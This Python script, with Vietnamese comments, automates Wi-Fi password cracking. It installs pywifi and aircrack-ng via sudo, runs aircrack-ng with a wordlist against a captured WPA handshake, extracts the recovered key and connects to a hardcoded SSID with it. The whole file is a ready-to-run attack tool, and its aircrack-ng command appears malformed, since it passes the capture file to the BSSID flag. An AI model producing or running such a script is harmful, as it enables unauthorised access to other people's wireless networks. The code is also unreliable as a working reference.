import subprocess
import sys
import os
import time

try:
    import pywifi
    from pywifi import const
except ImportError:
    print("Đang cài đặt pywifi...")
    subprocess.check_call(["sudo", "python3", "-m", "pip", "install", "pywifi"])
    import pywifi
    from pywifi import const

# Kiểm tra xem file wordlist và handshake có tồn tại hay không
WORDLIST_FILE = "wordlist.txt"
HANDSHAKE_FILE = "handshake.cap"

if not os.path.exists(WORDLIST_FILE):
    print(f"File wordlist '{WORDLIST_FILE}' không tìm thấy. Vui lòng đặt file wordlist vào thư mục dự án.")
    exit()

if not os.path.exists(HANDSHAKE_FILE):
    print(f"File handshake '{HANDSHAKE_FILE}' không tìm thấy. Vui lòng đặt file handshake vào thư mục dự án.")
    exit()

# Định nghĩa sẵn SSID
WIFI_SSID = "Neyuh"  # Thay đổi SSID của bạn ở đây

def connect_to_wifi(ssid, password):
    # Giữ nguyên hàm connect_to_wifi như trước
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    for _ in range(30):
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(1)
    return False

if __name__ == "__main__":
    # Kiểm tra và cài đặt aircrack-ng
    try:
        subprocess.check_output(["aircrack-ng", "--help"])
    except FileNotFoundError:
        print("aircrack-ng chưa được tìm thấy. Vui lòng cài đặt aircrack-ng trước khi chạy script.")
        exit()
    except subprocess.CalledProcessError:
        print("aircrack-ng chưa được cài đặt. Đang cài đặt...")
        subprocess.check_call(["sudo", "apt", "update"])
        subprocess.check_call(["sudo", "apt", "install", "-y", "aircrack-ng"])

    try:
        # Bỏ "wsl" khỏi lệnh 
        command = f"aircrack-ng -w {WORDLIST_FILE} -b {HANDSHAKE_FILE}" 
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if "KEY FOUND!" in stdout.decode():
            password = stdout.decode().split("KEY FOUND! [")[1].split("]")[0]
            print(f"Mật khẩu được tìm thấy: {password}")
            if connect_to_wifi(WIFI_SSID, password):
                print(f"Kết nối thành công tới {WIFI_SSID} với mật khẩu {password}")
            else:
                print("Không thể kết nối, mặc dù đã tìm thấy mật khẩu.")
        else:
            print("Không tìm thấy mật khẩu trong wordlist.")
            print(stderr.decode())
    except Exception as e:
        print(f"Lỗi: {e}")